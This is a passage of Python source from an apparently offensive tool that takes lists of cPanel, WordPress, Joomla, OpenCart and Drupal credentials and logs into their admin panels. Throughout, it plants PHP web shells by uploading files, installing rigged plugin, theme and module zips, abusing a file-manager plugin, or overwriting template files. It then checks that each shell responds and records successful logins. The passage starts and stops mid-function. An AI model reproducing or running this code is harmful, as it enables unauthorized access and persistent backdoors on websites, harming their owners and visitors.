            else:
                reqFox = requests.session()
                try: loginCP_Fox2 = content_Fox(reqFox.post('{}/login/?login_only=1'.format(ip), verify=False, data=postlogin_Fox, headers=headers1, timeout=10))
                except: loginCP_Fox2 = content_Fox(reqFox.post('{}/login/?login_only=1'.format(ip), verify=False, data=postlogin_Fox, headers=headers1, timeout=15))
                loginJson = json.loads(loginCP_Fox2)
                idcp_Fox = loginJson["security_token"][1:]
            if (re.findall(re.compile('PAGE.domain.*=.*"(.*)";'), loginCP_Fox)): domain_Fox = re.findall(re.compile('PAGE.domain.*=.*"(.*)";'), loginCP_Fox)[0]
            elif (re.findall(re.compile('<a id="lnkMaintain_DomainName" href="security/tls_status/#/?domain=(.*)">'), loginCP_Fox)): domain_Fox = re.findall(re.compile('<a id="lnkMaintain_DomainName" href="security/tls_status/#/?domain=(.*)">'), loginCP_Fox)[0]
            elif (re.findall(re.compile('<tr id="domainNameRow" ng-controller="sslStatusController" ng-init="primaryDomain = \'(.*)\'; "'), loginCP_Fox)): domain_Fox = re.findall(re.compile( '<tr id="domainNameRow" ng-controller="sslStatusController" ng-init="primaryDomain = \'(.*)\'; "'), loginCP_Fox)[0]
            elif (re.findall(re.compile('<span id="txtDomainName" class="general-info-value">(.*)</span>'), loginCP_Fox)): domain_Fox = re.findall(re.compile('<span id="txtDomainName" class="general-info-value">(.*)</span>'), loginCP_Fox)[0]
            elif (re.findall(re.compile('<b>(.*)</b>'), loginCP_Fox)): domain_Fox = re.findall(re.compile('<b>(.*)</b>'), loginCP_Fox)[0]
            if (re.findall(re.compile('/home(.*){}'.format(username)), loginCP_Fox)): home = '/home{}'.format(re.findall(re.compile('/home(.*){}'.format(username)), loginCP_Fox)[0])
            else: home = '/home/'
            return reqFox, idcp_Fox, domain_Fox, home
        else: return False
    except:
        return False

def file_UPloader_cP(ip, username, cookies, idcp, domain, home):
    try:
        filename = '{}.php'.format(random_Fox(8))
        filedata_Fox = {'dir': '{}{}/public_html'.format(home, username), 'get_disk_info': '1', 'overwrite': '0'}
        fileup_Fox = {'file-0': (filename, shell_Fox)}
        try: upload_Fox = cookies.post('{}/{}/execute/Fileman/upload_files'.format(ip, idcp), verify=False, data=filedata_Fox, files=fileup_Fox, headers=headers1, timeout=120)
        except: upload_Fox = cookies.post('{}/{}/execute/Fileman/upload_files'.format(ip, idcp), verify=False, data=filedata_Fox, files=fileup_Fox, headers=headers1, timeout=150)
        time.sleep(3)
        try:
            shell_path = 'https://{}/{}'.format(domain, filename)
            check = content_Fox(requests.get(shell_path, headers=headers1, timeout=15))
        except:
            shell_path = 'http://{}/{}'.format(domain, filename)
            check = content_Fox(requests.get(shell_path, headers=headers1, verify=False, timeout=15))
        if ('KEY:' in check or 'MD5:' in check): return shell_path
        else: return False
    except:
        return False

def cPanel(cP_data, up=0):
    try:
        if (int(cP_data.count('|')) != 2): print('   {}[-] The list must be https://domain.com:2083|username|password'.format(fr)); return False
        cp = cP_data.split('|')
        ip = cp[0]
        username = cp[1]
        password = cp[2]
        print ('   [*] cPanel: {}'.format(ip))
        print ('   [*] Username: {}'.format(username))
        print ('   [*] Password: {}'.format(password))
        login_Fox = cPanel_Login(ip, username, password)
        if (login_Fox is False): print('   {}[-] Login Failed.'.format(fr)); return False
        open('Results/Login_Successful_cPanels.txt', 'a').write('{}\n'.format(cP_data))
        print ('   {}[+] Login successful.'.format(fg))
        if (int(up) == 1):
            shell_path = file_UPloader_cP(ip, username, login_Fox[0], login_Fox[1], login_Fox[2], login_Fox[3])
            if (shell_path is False): print("   {}[-] Failed upload.".format(fr)); return False
            else: return shell_path
        else:
            return login_Fox[0], login_Fox[1], login_Fox[2], login_Fox[3]
    except:
        print('   {}[-] Failed.'.format(fr)); return False

def randomPluginWP_Fox(url, cookies):
    try:
        foldername = random_Fox(7)
        try:plugin_install_php = content_Fox(cookies.get('{}/wp-admin/plugin-install.php?tab=upload'.format(url), headers=headers1, timeout=15))
        except: plugin_install_php = content_Fox(cookies.get('{}/wp-admin/plugin-install.php?tab=upload'.format(url), headers=headers1, verify=False, timeout=10))
        if (not re.findall(re.compile('id="_wpnonce" name="_wpnonce" value="(.*)"'), plugin_install_php)): return 'F'
        ID_wp = re.findall(re.compile('id="_wpnonce" name="_wpnonce" value="(.*)"'), plugin_install_php)[0]
        if ('"' in ID_wp): ID_wp = ID_wp.split('"')[0]
        filedata_Fox = {'_wpnonce': ID_wp, '_wp_http_referer': '/wp-admin/plugin-install.php?tab=upload', 'install-plugin-submit': 'Install Now'}
        fileup_Fox = {'pluginzip': ('{}.zip'.format(foldername), open('Files/plugin.zip', 'rb'), 'multipart/form-data')}
        try: upload = cookies.post('{}/wp-admin/update.php?action=upload-plugin'.format(url), data=filedata_Fox, files=fileup_Fox, headers=headers1, timeout=60)
        except: upload = cookies.post('{}/wp-admin/update.php?action=upload-plugin'.format(url), data=filedata_Fox, files=fileup_Fox, headers=headers1, verify=False, timeout=60)
        shellname = '{}/wp-content/plugins/{}/index.php'.format(url, foldername)
        check = requestG_Fox(shellname, 1, headers1)
        if ('KEY:' in check or 'MD5:' in check): return shellname
        return 'F'
    except:
        return 'F'

def wp_file_manager_Fox(domain, cookies) :
    try :
        filename = '{}.php'.format(random_Fox(8))
        shell = file_get_contents_Fox('Files/bk.txt')
        try: getID = content_Fox(cookies.get('{}/wp-admin/plugin-install.php?s=File+Manager&tab=search&type=term'.format(domain),  verify=False, headers=headers1, timeout=15))
        except: getID = content_Fox(cookies.get('{}/wp-admin/plugin-install.php?s=File+Manager&tab=search&type=term'.format(domain),  verify=False, headers=headers1, timeout=10))
        if ('admin.php?page=wp_file_manager' in getID) :
            try: getID = content_Fox(cookies.get('{}/wp-admin/admin.php?page=wp_file_manager#elf_l1_Lw'.format(domain), verify=False, headers=headers1, timeout=15))
            except: getID = content_Fox(cookies.get('{}/wp-admin/admin.php?page=wp_file_manager#elf_l1_Lw'.format(domain), verify=False, headers=headers1, timeout=10))
            if (re.findall(re.compile('admin-ajax.php","nonce":"(.*)","lang"'), getID)) :
                ID_wp = re.findall(re.compile('admin-ajax.php","nonce":"(.*)","lang"'), getID)[0]
                if ('"' in ID_wp): ID_wp = ID_wp.split('"')[0]
                fileup_Fox = {'upload[]': (filename, shell, 'multipart/form-data')}
                filedata_Fox = {'_wpnonce': ID_wp, 'action': 'mk_file_folder_manager', 'cmd': 'upload', 'target': 'l1_Lw'}
                try : up_Fox = cookies.post('{}/wp-admin/admin-ajax.php'.format(domain), data=filedata_Fox, files=fileup_Fox, verify=False, headers=headers1, timeout=60)
                except : up_Fox = cookies.post('{}/wp-admin/admin-ajax.php'.format(domain), data=filedata_Fox, files=fileup_Fox, verify=False, headers=headers1, timeout=45)
                check_UP = requestG_Fox('{}/{}'.format(domain, filename), 1, headers1)
                if ('KEY:' in check_UP or 'MD5:' in check_UP) : return'{}/{}'.format(domain, filename)
        elif ((re.findall(re.compile('plugins.php\?_wpnonce=(.*)&#038;action=activate&#038;plugin=wp-file-manager'), getID) or re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" target="_parent">(.*)</a> <a'), getID) or re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" >(.*)</a> <a'), getID))) :
            if (re.findall(re.compile('plugins.php\?_wpnonce=(.*)&#038;action=activate&#038;plugin=wp-file-manager'), getID)) : ID_wp = re.findall(re.compile('plugins.php\?_wpnonce=(.*)&#038;action=activate&#038;plugin=wp-file-manager'), getID)[0]
            elif (re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" target="_parent">(.*)</a> <a'), getID)) : ID_wp = re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" target="_parent">(.*)</a> <a'), getID)[0][0]
            elif (re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" >(.*)</a> <a'), getID)) : ID_wp = re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" >(.*)</a> <a'), getID)[0][0]
            try: install = cookies.get('{}/wp-admin/plugins.php?action=activate&plugin=wp-file-manager/file_folder_manager.php&_wpnonce={}'.format(domain, ID_wp), verify=False, headers=headers1, timeout=45)
            except: install = cookies.get('{}/wp-admin/plugins.php?action=activate&plugin=wp-file-manager/file_folder_manager.php&_wpnonce={}'.format(domain, ID_wp), verify=False, headers=headers1, timeout=30)
            try : getID = content_Fox(cookies.get('{}/wp-admin/admin.php?page=wp_file_manager#elf_l1_Lw'.format(domain), verify=False, headers=headers1, timeout=15))
            except : getID = content_Fox(cookies.get('{}/wp-admin/admin.php?page=wp_file_manager#elf_l1_Lw'.format(domain), verify=False, headers=headers1, timeout=10))
            if (re.findall(re.compile('admin-ajax.php","nonce":"(.*)","lang"'), getID)) :
                ID_wp = re.findall(re.compile('admin-ajax.php","nonce":"(.*)","lang"'), getID)[0]
                if ('"' in ID_wp): ID_wp = ID_wp.split('"')[0]
                fileup_Fox = {'upload[]': (filename, shell, 'multipart/form-data')}
                filedata_Fox = {'_wpnonce': ID_wp, 'action': 'mk_file_folder_manager', 'cmd': 'upload', 'target': 'l1_Lw'}
                try : up_Fox = cookies.post('{}/wp-admin/admin-ajax.php'.format(domain), data=filedata_Fox, files=fileup_Fox, verify=False, headers=headers1, timeout=60)
                except : up_Fox = cookies.post('{}/wp-admin/admin-ajax.php'.format(domain), data=filedata_Fox, files=fileup_Fox, verify=False, headers=headers1, timeout=45)
                check_UP = requestG_Fox('{}/{}'.format(domain,filename), 1, headers1)
                if ('KEY:' in check_UP or 'MD5:' in check_UP) : return '{}/{}'.format(domain, filename)
        elif (re.findall(re.compile('\?action=upgrade-plugin&#038;plugin=wp-file-manager%2Ffile_folder_manager.php&#038;_wpnonce=(.*)" aria-label="(.*)" data-name="'), getID)):
            ID_wp = re.findall(re.compile('\?action=upgrade-plugin&#038;plugin=wp-file-manager%2Ffile_folder_manager.php&#038;_wpnonce=(.*)" aria-label="(.*)" data-name="'), getID)[0][0]
            try: upgrade = content_Fox(cookies.get('{}/wp-admin/update.php?action=upgrade-plugin&plugin=wp-file-manager%2Ffile_folder_manager.php&_wpnonce={}'.format(domain, ID_wp), verify=False, headers=headers1, timeout=45))
            except: upgrade = content_Fox(cookies.get('{}/wp-admin/update.php?action=upgrade-plugin&plugin=wp-file-manager%2Ffile_folder_manager.php&_wpnonce={}'.format(domain, ID_wp), verify=False, headers=headers1, timeout=30))
            if ((re.findall(re.compile('plugins.php\?_wpnonce=(.*)&#038;action=activate&#038;plugin=wp-file-manager'), upgrade) or re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" target="_parent">(.*)</a> <a'), upgrade) or re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" >(.*)</a> <a'), upgrade))) :
                if (re.findall(re.compile('plugins.php\?_wpnonce=(.*)&#038;action=activate&#038;plugin=wp-file-manager'), upgrade)) : ID_wp = re.findall(re.compile('plugins.php\?_wpnonce=(.*)&#038;action=activate&#038;plugin=wp-file-manager'), upgrade)[0]
                elif (re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" target="_parent">(.*)</a> <a'), upgrade)) : ID_wp = re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" target="_parent">(.*)</a> <a'), upgrade)[0][0]
                elif (re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" >(.*)</a> <a'), upgrade)) : ID_wp = re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" >(.*)</a> <a'), upgrade)[0][0]
                try: install = cookies.get('{}/wp-admin/plugins.php?action=activate&plugin=wp-file-manager/file_folder_manager.php&_wpnonce={}'.format(domain, ID_wp), verify=False, headers=headers1, timeout=45)
                except: install = cookies.get('{}/wp-admin/plugins.php?action=activate&plugin=wp-file-manager/file_folder_manager.php&_wpnonce={}'.format(domain, ID_wp), verify=False, headers=headers1, timeout=30)
                try: getID = content_Fox(cookies.get('{}/wp-admin/admin.php?page=wp_file_manager#elf_l1_Lw'.format(domain), verify=False, headers=headers1, timeout=15))
                except: getID = content_Fox(cookies.get('{}/wp-admin/admin.php?page=wp_file_manager#elf_l1_Lw'.format(domain), verify=False, headers=headers1, timeout=10))
                if (re.findall(re.compile('admin-ajax.php","nonce":"(.*)","lang"'), getID)) :
                    ID_wp = re.findall(re.compile('admin-ajax.php","nonce":"(.*)","lang"'), getID)[0]
                    if ('"' in ID_wp): ID_wp = ID_wp.split('"')[0]
                    fileup_Fox = {'upload[]': (filename, shell, 'multipart/form-data')}
                    filedata_Fox = {'_wpnonce': ID_wp, 'action': 'mk_file_folder_manager', 'cmd': 'upload', 'target': 'l1_Lw'}
                    try : up_Fox = cookies.post('{}/wp-admin/admin-ajax.php'.format(domain), data=filedata_Fox, files=fileup_Fox, verify=False, headers=headers1, timeout=60)
                    except : up_Fox = cookies.post('{}/wp-admin/admin-ajax.php'.format(domain), data=filedata_Fox, files=fileup_Fox, verify=False, headers=headers1, timeout=45)
                    check_UP = requestG_Fox('{}/{}'.format(domain,filename), 1, headers1)
                    if ('KEY:' in check_UP or 'MD5:' in check_UP): return '{}/{}'.format(domain, filename)
        elif (re.findall(re.compile('wp-file-manager&#038;_wpnonce=(.*)" aria-label="(.*)" data-name='),getID)) :
            ID_wp = re.findall(re.compile('wp-file-manager&#038;_wpnonce=(.*)" aria-label="(.*)" data-name='),getID)[0][0]
            try : donwload = content_Fox(cookies.get('{}/wp-admin/update.php?action=install-plugin&plugin=wp-file-manager&_wpnonce={}'.format(domain, ID_wp), verify=False, headers=headers1, timeout=45))
            except : donwload = content_Fox(cookies.get('{}/wp-admin/update.php?action=install-plugin&plugin=wp-file-manager&_wpnonce={}'.format(domain, ID_wp), verify=False, headers=headers1, timeout=30))
            if ((re.findall(re.compile('plugins.php\?_wpnonce=(.*)&#038;action=activate&#038;plugin=wp-file-manager'), donwload) or re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" target="_parent">(.*)</a> <a'), donwload) or re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" >(.*)</a> <a'), donwload))) :
                if (re.findall(re.compile('plugins.php\?_wpnonce=(.*)&#038;action=activate&#038;plugin=wp-file-manager'), donwload)) : ID_wp = re.findall(re.compile('plugins.php\?_wpnonce=(.*)&#038;action=activate&#038;plugin=wp-file-manager'), donwload)[0]
                elif (re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" target="_parent">(.*)</a> <a'), donwload)) : ID_wp = re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" target="_parent">(.*)</a> <a'), donwload)[0][0]
                elif (re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" >(.*)</a> <a'), donwload)) : ID_wp = re.findall(re.compile('file_folder_manager.php&amp;_wpnonce=(.*)" >(.*)</a> <a'), donwload)[0][0]
                try: install = cookies.get('{}/wp-admin/plugins.php?action=activate&plugin=wp-file-manager/file_folder_manager.php&_wpnonce={}'.format(domain, ID_wp), verify=False, headers=headers1, timeout=45)
                except: install = cookies.get('{}/wp-admin/plugins.php?action=activate&plugin=wp-file-manager/file_folder_manager.php&_wpnonce={}'.format(domain, ID_wp), verify=False, headers=headers1, timeout=30)
                try: getID = content_Fox(cookies.get('{}/wp-admin/admin.php?page=wp_file_manager#elf_l1_Lw'.format(domain), verify=False, headers=headers1, timeout=15))
                except: getID = content_Fox(cookies.get('{}/wp-admin/admin.php?page=wp_file_manager#elf_l1_Lw'.format(domain), verify=False, headers=headers1, timeout=10))
                if (re.findall(re.compile('admin-ajax.php","nonce":"(.*)","lang"'), getID)) :
                    ID_wp = re.findall(re.compile('admin-ajax.php","nonce":"(.*)","lang"'), getID)[0]
                    if ('"' in ID_wp): ID_wp = ID_wp.split('"')[0]
                    fileup_Fox = {'upload[]': (filename, shell, 'multipart/form-data')}
                    filedata_Fox = {'_wpnonce': ID_wp, 'action': 'mk_file_folder_manager', 'cmd': 'upload', 'target': 'l1_Lw'}
                    try : up_Fox = cookies.post('{}/wp-admin/admin-ajax.php'.format(domain), data=filedata_Fox, files=fileup_Fox, verify=False, headers=headers1, timeout=60)
                    except : up_Fox = cookies.post('{}/wp-admin/admin-ajax.php'.format(domain), data=filedata_Fox, files=fileup_Fox, verify=False, headers=headers1, timeout=45)
                    check_UP = requestG_Fox('{}/{}'.format(domain,filename), 1, headers1)
                    if ('KEY:' in check_UP or 'MD5:' in check_UP): return '{}/{}'.format(domain, filename)
        return 'F'
    except:
        return 'F'

def randomThemeWP_Fox(url, cookies) :
    try:
        foldername = random_Fox(7)
        try: theme_install_php = content_Fox(cookies.get('{}/wp-admin/theme-install.php?tab=upload'.format(url), headers=headers1, timeout=15))
        except: theme_install_php = content_Fox(cookies.get('{}/wp-admin/theme-install.php?tab=upload'.format(url), headers=headers1, verify=False, timeout=10))
        if (not re.findall(re.compile('id="_wpnonce" name="_wpnonce" value="(.*)"'), theme_install_php)): return 'F'
        ID_wp = re.findall(re.compile('id="_wpnonce" name="_wpnonce" value="(.*)"'), theme_install_php)[0]
        if ('"' in ID_wp): ID_wp = ID_wp.split('"')[0]
        filedata_Fox = {'_wpnonce': ID_wp, '_wp_http_referer': '/wp-admin/theme-install.php?tab=upload', 'install-theme-submit': 'Installer'}
        fileup_Fox = {'themezip': ('{}.zip'.format(foldername), open('Files/theme.zip', 'rb'), 'multipart/form-data')}
        try: upload_Fox = cookies.post('{}/wp-admin/update.php?action=upload-theme'.format(url), data=filedata_Fox, files=fileup_Fox, headers=headers1, timeout=60)
        except: upload_Fox = cookies.post('{}/wp-admin/update.php?action=upload-theme'.format(url), data=filedata_Fox, files=fileup_Fox, headers=headers1, verify=False, timeout=90)
        shellname = '{}/wp-content/themes/{}/archive.php'.format(url, foldername)
        check = requestG_Fox(shellname, 1, headers1)
        if ('KEY:' in check or 'MD5:' in check): return shellname
        return 'F'
    except:
        return 'F'

def mod_ariimageslidersa_Fox(domain, cookies) :
    try:
        try: plugin_install_Fox = content_Fox(cookies.get('{}/administrator/index.php?option=com_installer'.format(domain), headers=headers1, verify=False, timeout=15))
        except: plugin_install_Fox = content_Fox(cookies.get('{}/administrator/index.php?option=com_installer'.format(domain), headers=headers1, verify=False, timeout=10))
        if (re.findall(re.compile('value="(.*)tmp".*/>'), plugin_install_Fox)):
            directory_Fox = '{}tmp'.format(re.findall(re.compile('value="(.*)tmp".*/>'), plugin_install_Fox)[0])
            rhash_Fox = re.findall(re.compile('type="hidden" name="(.*)" value="1"'), plugin_install_Fox)[0]
            filedata_Fox = {'install_directory': directory_Fox, 'install_url': '', 'type': '', 'installtype': 'upload', 'task': 'install.install', rhash_Fox: '1', 'return': ',{}'.format(rhash_Fox)}
            fileup_Fox = {'install_package': ('mod_ariimageslidersa.zip', open('Files/mod_ariimageslidersa.zip', 'rb'), 'multipart/form-data')}
            try: up_Fox = cookies.post('{}/administrator/index.php?option=com_installer&view=install'.format(domain), verify=False, data=filedata_Fox, files=fileup_Fox, headers=headers1, timeout=45)
            except: up_Fox = cookies.post('{}/administrator/index.php?option=com_installer&view=install'.format(domain), verify=False, data=filedata_Fox, files=fileup_Fox, headers=headers1, timeout=60)
            check_plugin_shell = requestG_Fox('{}/modules/mod_ariimageslidersa/mod_ariimageslidersa.php'.format(domain), 1, headers1)
            if ('KEY:' in check_plugin_shell or 'MD5:' in check_plugin_shell): return '{}/modules/mod_ariimageslidersa/mod_ariimageslidersa.php'.format(domain)
        return 'F'
    except:
        return 'F'

def mod_simplefileuploadJ30v1_Fox(domain, cookies) :
    try:
        try: plugin_install_Fox = content_Fox(cookies.get('{}/administrator/index.php?option=com_installer'.format(domain), verify=False, headers=headers1, timeout=15))
        except: plugin_install_Fox = content_Fox(cookies.get('{}/administrator/index.php?option=com_installer'.format(domain), verify=False, headers=headers1, timeout=10))
        if (re.findall(re.compile('value="(.*)tmp".*/>'), plugin_install_Fox)):
            directory_Fox = '{}tmp'.format(re.findall(re.compile('value="(.*)tmp".*/>'), plugin_install_Fox)[0])
            rhash_Fox = re.findall(re.compile('type="hidden" name="(.*)" value="1"'), plugin_install_Fox)[0]
            filedata_Fox = {'install_directory': directory_Fox, 'install_url': '', 'type': '', 'installtype': 'upload', 'task': 'install.install', rhash_Fox: '1', 'return': ',{}'.format(rhash_Fox)}
            fileup_Fox = {'install_package': ('mod_simplefileuploadJ30v1.3.5.zip', open('Files/mod_simplefileuploadJ30v1.3.5.zip', 'rb'), 'multipart/form-data')}
            try: up_Fox = cookies.post('{}/administrator/index.php?option=com_installer&view=install'.format(domain), verify=False, data=filedata_Fox, files=fileup_Fox, headers=headers1, timeout=90)
            except: up_Fox = cookies.post('{}/administrator/index.php?option=com_installer&view=install'.format(domain), verify=False, data=filedata_Fox, files=fileup_Fox, headers=headers1, timeout=60)
            check_plugin_shell = requestG_Fox('{}/modules/mod_simplefileuploadv1.3/elements/wcg9LbOHD14.php'.format(domain), 1, headers1)
            if ('KEY:' in check_plugin_shell or 'MD5:' in check_plugin_shell): return '{}/modules/mod_simplefileuploadv1.3/elements/wcg9LbOHD14.php'.format(domain)
        return 'F'
    except:
        return 'F'

def com_templates_Fox(domain, cookies) :
    shell = file_get_contents_Fox('Files/bk.txt')
    try:
        try: beez3 = content_Fox(cookies.get('{}/administrator/index.php?option=com_templates&view=template&id=503&file=L2pzc3RyaW5ncy5waHA='.format(domain), verify=False, headers=headers1, timeout=15))
        except: beez3 = content_Fox(cookies.get('{}/administrator/index.php?option=com_templates&view=template&id=503&file=L2pzc3RyaW5ncy5waHA='.format(domain), verify=False, headers=headers1, timeout=10))
        if ('jsstrings.php' in beez3 and re.findall(re.compile('type="hidden" name="(.*)" value="1"'), beez3)):
            rhash_Fox = re.findall(re.compile('type="hidden" name="(.*)" value="1"'), beez3)[0]
            edit_file_Fox = {'jform[source]': shell, 'task': 'template.apply', rhash_Fox: '1', 'jform[extension_id]': '503', 'jform[filename]': '/jsstrings.php'}
            try: edit_Fox = cookies.post('{}/administrator/index.php?option=com_templates&view=template&id=503&file=L2pzc3RyaW5ncy5waHA='.format(domain), data=edit_file_Fox, verify=False, headers=headers1, timeout=60)
            except: edit_Fox = cookies.post('{}/administrator/index.php?option=com_templates&view=template&id=503&file=L2pzc3RyaW5ncy5waHA='.format(domain), data=edit_file_Fox, verify=False, headers=headers1, timeout=45)
            check_UP = requestG_Fox('{}/templates/beez3/jsstrings.php'.format(domain), 1, headers1)
            if ('KEY:' in check_UP or 'MD5:' in check_UP): return '{}/templates/beez3/jsstrings.php'.format(domain)
        else:
            try: hathor = content_Fox(cookies.get('{}/administrator/index.php?option=com_templates&view=template&id=504&file=L2Vycm9yLnBocA=='.format(domain), verify=False, headers=headers1, timeout=15))
            except: hathor = content_Fox(cookies.get('{}/administrator/index.php?option=com_templates&view=template&id=504&file=L2Vycm9yLnBocA=='.format(domain), verify=False, headers=headers1, timeout=10))
            if ('error.php' in hathor and re.findall(re.compile('type="hidden" name="(.*)" value="1"'), hathor)):
                rhash_Fox = re.findall(re.compile('type="hidden" name="(.*)" value="1"'), hathor)[0]
                edit_file_Fox = {'jform[source]': shell, 'task': 'template.apply', rhash_Fox: '1', 'jform[extension_id]': '504', 'jform[filename]': '/error.php'}
                try: edit_Fox = cookies.post('{}/administrator/index.php?option=com_templates&view=template&id=504&file=L2Vycm9yLnBocA=='.format(domain), data=edit_file_Fox, verify=False, headers=headers1, timeout=60)
                except: edit_Fox = cookies.post('{}/administrator/index.php?option=com_templates&view=template&id=504&file=L2Vycm9yLnBocA=='.format(domain), data=edit_file_Fox, verify=False, headers=headers1, timeout=45)
                check_UP = requestG_Fox('{}/administrator/templates/hathor/error.php'.format(domain), 1, headers1)
                if ('KEY:' in check_UP or 'MD5:' in check_UP): return '{}/administrator/templates/hathor/error.php'.format(domain)
            elif ('error.css' in hathor and re.findall(re.compile('type="hidden" name="(.*)" value="1"'), hathor)):
                rhash_Fox = re.findall(re.compile('type="hidden" name="(.*)" value="1"'), hathor)[0]
                edit_file_Fox = {'jform[source]': shell, 'task': 'template.apply', rhash_Fox: '1', 'jform[extension_id]': '504', 'jform[filename]': '/error.php'}
                try: edit_Fox = cookies.post('{}/administrator/index.php?option=com_templates&task=source.edit&id=NTA0OmVycm9yLnBocA=='.format(domain), data=edit_file_Fox, verify=False, headers=headers1, timeout=60)
                except: edit_Fox = cookies.post('{}/administrator/index.php?option=com_templates&task=source.edit&id=NTA0OmVycm9yLnBocA=='.format(domain), data=edit_file_Fox, verify=False, headers=headers1, timeout=45)
                check_UP = requestG_Fox('{}/administrator/templates/hathor/error.php'.format(domain), 1, headers1)
                if ('KEY:' in check_UP or 'MD5:' in check_UP): return '{}/administrator/templates/hathor/error.php'.format(domain)
        return 'F'
    except:
        return 'F'

def ocmod_Fox(domain, cookies, login) :
    try:
        token_Fox = re.findall(re.compile('token=(.*)" class="navbar-brand">'), login)[0]
        if ('&user_token' in login): upload_url_Fox = "{}/admin/index.php?route=marketplace/installer/upload&user_token={}".format(domain, token_Fox)
        else: upload_url_Fox = "{}/admin/index.php?route=marketplace/installer/upload&token={}".format(domain, token_Fox)
        fileup_Fox = {'file': ('rsz.ocmod.zip', open('Files/rsz.ocmod.zip', 'rb'), 'application/x-zip-compressed')}
        try: up_Fox = content_Fox(cookies.post(upload_url_Fox, files=fileup_Fox, headers=headers1, verify=False, timeout=60))
        except: up_Fox = content_Fox(cookies.post(upload_url_Fox, files=fileup_Fox, headers=headers1, verify=False, timeout=45))
        ID_oc = re.findall(re.compile('extension_install_id=(.*)"}'), up_Fox)[0]
        try: cookies.get('{}&extension_install_id={}'.format(upload_url_Fox.replace('marketplace/installer/upload', 'marketplace/install/install'), ID_oc), verify=False, headers=headers1, timeout=15)
        except: cookies.get('{}&extension_install_id={}'.format(upload_url_Fox.replace('marketplace/installer/upload', 'marketplace/install/install'), ID_oc), verify=False, headers=headers1, timeout=10)
        try: cookies.get('{}&extension_install_id={}'.format(upload_url_Fox.replace('marketplace/installer/upload', 'marketplace/install/unzip'), ID_oc), verify=False, headers=headers1, timeout=15)
        except: cookies.get('{}&extension_install_id={}'.format(upload_url_Fox.replace('marketplace/installer/upload', 'marketplace/install/unzip'), ID_oc), verify=False, headers=headers1, timeout=10)
        try: cookies.get('{}&extension_install_id={}'.format(upload_url_Fox.replace('marketplace/installer/upload', 'marketplace/install/move'), ID_oc), verify=False, headers=headers1, timeout=15)
        except: cookies.get('{}&extension_install_id={}'.format(upload_url_Fox.replace('marketplace/installer/upload', 'marketplace/install/move'), ID_oc), verify=False, headers=headers1, timeout=10)
        try: cookies.get('{}&extension_install_id={}'.format(upload_url_Fox.replace('marketplace/installer/upload', 'marketplace/install/xml'), ID_oc), verify=False, headers=headers1, timeout=15)
        except: cookies.get('{}&extension_install_id={}'.format(upload_url_Fox.replace('marketplace/installer/upload', 'marketplace/install/xml'), ID_oc), verify=False, headers=headers1, timeout=10)
        try: cookies.get('{}&extension_install_id={}'.format(upload_url_Fox.replace('marketplace/installer/upload', 'marketplace/install/remove'), ID_oc), verify=False, headers=headers1, timeout=15)
        except: cookies.get('{}&extension_install_id={}'.format(upload_url_Fox.replace('marketplace/installer/upload', 'marketplace/install/remove'), ID_oc), verify=False, headers=headers1, timeout=10)
        check_UP = requestG_Fox('{}/admin/controller/extension/extension/daDTLv3YPn6.php'.format(domain), 1, headers1)
        if ('KEY:' in check_UP or 'MD5:' in check_UP): return '{}/admin/controller/extension/extension/daDTLv3YPn6.php'.format(domain)
        return 'F'
    except:
        return 'F'

def adminimal_Fox(url, cookies) :
    try:
        try: getdata = content_Fox(cookies.get('{}/admin/appearance/install'.format(url), headers=headers1, verify=False, timeout=15))
        except: getdata = content_Fox(cookies.get('{}/admin/appearance/install'.format(url), headers=headers1, verify=False, timeout=10))
        form_build_id_Fox = re.findall(re.compile('type="hidden" name="form_build_id" value="(.*)" />'), getdata)[0]
        form_token_Fox = re.findall(re.compile('type="hidden" name="form_token" value="(.*)" />'), getdata)[0]
        fileup_Fox = {'files[project_upload]': ('adminimal_theme-7.x-1.25.zip', open('Files/adminimal_theme-7.x-1.25.zip', 'rb'), 'multipart/form-data')}
        filedata_Fox = {'form_build_id': form_build_id_Fox, 'form_id': 'update_manager_install_form', 'form_token': form_token_Fox, 'op': 'Install', 'project_url': ''}
        try: up_Fox = content_Fox(cookies.post('{}/admin/appearance/install'.format(url), headers=headers1, data=filedata_Fox, files=fileup_Fox, verify=False, timeout=90))
        except: up_Fox = content_Fox(cookies.post('{}/admin/appearance/install'.format(url), headers=headers1, data=filedata_Fox, files=fileup_Fox, verify=False, timeout=60))
        ID_dp = re.findall(re.compile('id=(.*)&'), up_Fox)[0]
        try: install_Fox = cookies.get('{}/authorize.php?batch=1&op=start&id={}'.format(url, ID_dp), headers=headers1, verify=False, timeout=45)
        except: install_Fox = cookies.get('{}/authorize.php?batch=1&op=start&id={}'.format(url, ID_dp), headers=headers1, verify=False, timeout=30)
        check_UP = requestG_Fox('{}/sites/all/themes/adminimal_theme/uqPfX5TiZbY.php'.format(url), 1, headers1)
        if ('KEY:' in check_UP or 'MD5:' in check_UP): return '{}/sites/all/themes/adminimal_theme/uqPfX5TiZbY.php'.format(url)
        return 'F'
    except:
        return 'F'

def WP_Login_UPer(url, username, password):
    try:
        while (url[-1] == '/'): url = url[:-1]
        print ('   {}[L] {} {}[WordPress]'.format(fw, url, fg))
        print ('   {}[U] {}'.format(fw, username))
        print ('   {}[P] {}'.format(fw, password))
        reqFox = requests.session()
        headersLogin = {'Connection': 'keep-alive',
                        'Cache-Control': 'max-age=0',
                        'Upgrade-Insecure-Requests': '1',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36',
